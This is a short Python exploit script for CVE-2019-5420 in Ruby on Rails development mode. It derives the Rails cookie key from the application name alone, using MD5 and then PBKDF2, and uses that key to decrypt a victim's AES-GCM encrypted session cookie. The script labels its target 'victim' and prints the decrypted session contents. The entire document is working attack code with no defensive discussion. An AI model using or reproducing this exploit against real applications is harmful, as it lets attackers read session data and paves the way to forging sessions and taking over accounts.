import argparse
import hashlib
import base64
import urllib.parse
import sys
from Crypto.Cipher import AES
from log_colors import *

# CVE-2019-5420
# Rails <5.2.2.1, <6.0.0.beta3 development mode
class CVE2019_5420:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, app_name, cookie):
        print (LogColors.BLUE + "victim: " + app_name + "..." + LogColors.ENDC)
        self.app_name = app_name + "::Application"
        self.cookie = urllib.parse.unquote(cookie).encode()

    # decode credentials
    def decode_cookie(self):
        print (LogColors.BLUE + "decode cookie..." + LogColors.ENDC)
        separator = b"--"
        ciphertext_b64, iv_b64, tag_b64 = self.cookie.split(separator)
        ciphertext = base64.b64decode(ciphertext_b64)
        iv = base64.b64decode(iv_b64)
        tag = base64.b64decode(tag_b64)
        return (ciphertext, iv, tag)

    # generate key
    def generate_key(self):
        print (LogColors.BLUE + "generate key..." + LogColors.ENDC)
        md = hashlib.md5(self.app_name.encode()).hexdigest().encode("utf-8")
        key = hashlib.pbkdf2_hmac('sha1', md, b'authenticated encrypted cookie', 1000, 32)
        print (LogColors.GREEN + "successfully generate key..." + LogColors.ENDC)
        return key

    # decrypt
    # construct a Cipher object, with the key, iv, and 
    # additionally the
    # GCM tag used for authenticating the message.
    def decrypt(self, key, ciphertext, iv, tag):
        print (LogColors.BLUE + "decrypt..." + LogColors.ENDC)
        cipher = AES.new(key, AES.MODE_GCM, nonce = iv)
        try:
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            print (LogColors.GREEN + "successfully decrypt :)" + LogColors.ENDC)
            return decrypted
        except Exception as e:
            print (LogColors.RED + "failed to decrypt :(" + LogColors.ENDC)
            sys.exit()
    
    # exploitation logic
    def exploit(self):
        ciphertext, iv, tag = self.decode_cookie()
        key = self.generate_key()
        decrypted = self.decrypt(key, ciphertext, iv, tag)
        print (decrypted.decode())

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-a','--app', required = True, help = "application name")
    parser.add_argument('-c', '--cookie', required = True, help = "session cookie")
    args = vars(parser.parse_args())
    app, cookie = args['app'], args['cookie']
    cve = CVE2019_5420(app, cookie)
    cve.exploit()

